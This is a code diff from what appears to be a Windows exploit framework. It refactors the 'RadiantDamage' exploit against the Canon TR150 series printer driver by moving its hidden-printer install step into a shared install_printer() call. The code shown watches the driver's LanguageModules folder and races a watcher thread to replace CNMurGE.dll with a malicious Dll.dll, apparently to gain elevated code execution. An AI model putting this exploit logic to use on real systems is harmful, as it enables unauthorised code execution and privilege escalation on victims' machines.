@@ -22,36 +22,6 @@ namespace
         OVERLAPPED  Overlapped;
     } DIRECTORY_INFO, * PDIRECTORY_INFO, * LPDIRECTORY_INFO;
 
-    bool installPrinter(const std::string& p_driver)
-    {
-        std::cout << "[+] Installing printer" << std::endl;
-
-        std::wstring wdriver(p_driver.begin(), p_driver.end());
-
-        // install printer
-        PRINTER_INFO_2 printerInfo = { };
-        ZeroMemory(&printerInfo, sizeof(printerInfo));
-        printerInfo.pPortName = (LPWSTR)L"lpt1:";
-        printerInfo.pDriverName = (LPWSTR)wdriver.c_str();
-        printerInfo.pPrinterName = (LPWSTR)L"CanonPrinter";
-        printerInfo.pPrintProcessor = (LPWSTR)L"WinPrint";
-        printerInfo.pDatatype = (LPWSTR)L"RAW";
-        printerInfo.pComment = (LPWSTR)L"Canon TR150";
-        printerInfo.pLocation = (LPWSTR)L"Shared Canon Printer";
-        printerInfo.Attributes = PRINTER_ATTRIBUTE_RAW_ONLY | PRINTER_ATTRIBUTE_HIDDEN;
-        printerInfo.AveragePPM = 9001;
-        HANDLE hPrinter = AddPrinter(NULL, 2, (LPBYTE)&printerInfo);
-        if (hPrinter == 0)
-        {
-            std::cerr << "[-] Failed to create printer: " << GetLastError() << std::endl;
-            return false;
-        }
-
-        DeletePrinter(hPrinter);
-        ClosePrinter(hPrinter);
-        return true;
-    }
-
     HANDLE checkTargetDirectory(const std::string& p_targetDirectory)
     {
         std::wstring wtargetDirectory(p_targetDirectory.begin(), p_targetDirectory.end());
@@ -123,7 +93,7 @@ namespace
 }
 
 RadiantDamage::RadiantDamage() :
-	Exploit("Canon TR150 series"),
+	Exploit("Canon TR150 series", "RadiantDamage"),
 	m_target_directory("C:\\ProgramData\\CanonBJ\\IJPrinter\\CNMWINDOWS\\Canon TR150 series\\LanguageModules\\040C\\"),
     m_target_dll("CNMurGE.dll"),
     m_malicious_dll("Dll.dll")
@@ -145,7 +115,7 @@ bool RadiantDamage::do_exploit()
     if (dirInfo.hDir == INVALID_HANDLE_VALUE)
     {
         std::cout << "[-] Target directory doesn't exist. Trigger install. " << std::endl;
-        installPrinter(m_driverName);
+        install_printer();
         dirInfo.hDir = checkTargetDirectory(m_target_directory);
         if (dirInfo.hDir == INVALID_HANDLE_VALUE)
         {
@@ -180,7 +150,7 @@ bool RadiantDamage::do_exploit()
     {
         ReadDirectoryChangesW(dirInfo.hDir, dirInfo.lpBuffer, s_maxBuffer, TRUE, s_notifyFilter, &dirInfo.dwBufLength, &dirInfo.Overlapped, NULL);
         std::thread watch(handleDirectoryChange, hCompPort, m_target_dll, m_target_directory, m_malicious_dll);
-        installPrinter(m_driverName);
+        install_printer();
         watch.join();
         std::cout << "[+] Sleep for 3 seconds" << std::endl;
         std::this_thread::sleep_for(std::chrono::milliseconds(3000));
